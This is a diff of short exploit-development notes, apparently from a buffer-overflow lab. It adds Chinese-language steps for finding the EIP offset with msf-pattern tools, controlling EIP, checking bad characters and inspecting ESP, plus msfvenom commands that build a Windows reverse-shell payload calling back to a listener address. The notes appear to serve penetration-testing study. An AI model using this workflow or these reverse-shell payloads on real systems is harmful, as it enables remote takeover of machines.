@@ -8,11 +8,14 @@ msf-pattern_create -l 3000
 
 38744237
 
-
+1.找到crach數值
+2.根據數值生成序列找到EIP
 msf-pattern_offset -l 3000 -q 38744237
-
-
-1373
+3.根據EIP找到指定長度1373
+4.輸入指定1373長度的A+4個B確定可以控制EIP
+5.查找badchars
+A*1373+BBBB+badchars
+6.查找ESP floow in dump
 
 
 
@@ -29,3 +32,4 @@ Log data, item 3
 ##04##31##62##70
 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.23 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x04\x31\x62\x70"
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
